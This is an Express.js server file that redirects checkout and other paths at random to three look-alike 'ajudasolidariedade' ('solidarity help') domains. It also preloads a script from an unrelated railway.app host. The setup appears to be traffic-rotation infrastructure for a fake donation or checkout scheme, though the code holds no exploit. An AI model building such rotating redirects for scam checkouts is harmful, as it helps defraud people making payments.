const express = require("express");
const app = express();
const port = process.env.PORT || 8080;

app.use((req, res, next) => {
  res.setHeader(
    "Link",
    "<https://primary-production-95c0.up.railway.app/override.js>; rel=preload; as=script"
  );
  next();
});

// Array of base URLs for random selection
const CHECKOUT_URLS = [
  "https://ajudasolidariedade.site",
  "https://ajudasolidariedade2.site",
  "https://ajudasolidariedade3.site",
];

const MAIN_URLS = [
  "https://www.ajudasolidariedade.site",
  "https://www.ajudasolidariedade2.site",
  "https://www.ajudasolidariedade3.site",
];

// Improved random function with logging
function getRandomUrl(urlArray) {
  const randomIndex = Math.floor(Math.random() * urlArray.length);
  const selectedUrl = urlArray[randomIndex];
  console.log("Selected URL:", selectedUrl); // Log para debug
  return selectedUrl;
}

app.get("/checkout/:value", (req, res) => {
  // Get the checkout value from the URL
  const checkoutValue = req.params.value;

  // Get any additional query parameters
  const queryString = req.url.includes("?")
    ? req.url.substring(req.url.indexOf("?"))
    : "";

  // Get random checkout URL
  const randomCheckoutUrl = getRandomUrl(CHECKOUT_URLS);
  const redirectUrl = `${randomCheckoutUrl}/checkout/${checkoutValue}${queryString}`;

  console.log("Redirecting checkout to:", redirectUrl);
  res.redirect(301, redirectUrl);
});

// Special route for /up1
app.get("/up1", (req, res) => {
  // Get any additional query parameters
  const queryString = req.url.includes("?")
    ? req.url.substring(req.url.indexOf("?"))
    : "";

  // Get random checkout URL (using same as checkout)
  const randomCheckoutUrl = getRandomUrl(CHECKOUT_URLS);
  const redirectUrl = `${randomCheckoutUrl}/up1${queryString}`;

  console.log("Redirecting up1 to:", redirectUrl);
  res.redirect(301, redirectUrl);
});

// Default route for any other path
app.get("*", (req, res) => {
  // Redirect to main URL with the full path and query parameters
  const fullPath = req.url;

  // Get random main URL
  const randomMainUrl = getRandomUrl(MAIN_URLS);
  const redirectUrl = `${randomMainUrl}${fullPath}`;

  console.log("Redirecting other path to:", redirectUrl);
  res.redirect(301, redirectUrl);
});

// Adicionar verificação periódica da aleatoriedade
setInterval(() => {
  const testCheckout = getRandomUrl(CHECKOUT_URLS);
  const testMain = getRandomUrl(MAIN_URLS);
  console.log("Test random URLs - Checkout:", testCheckout, "Main:", testMain);
}, 60000); // Verifica a cada minuto

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
  console.log("Available Checkout URLs:", CHECKOUT_URLS);
  console.log("Available Main URLs:", MAIN_URLS);
});
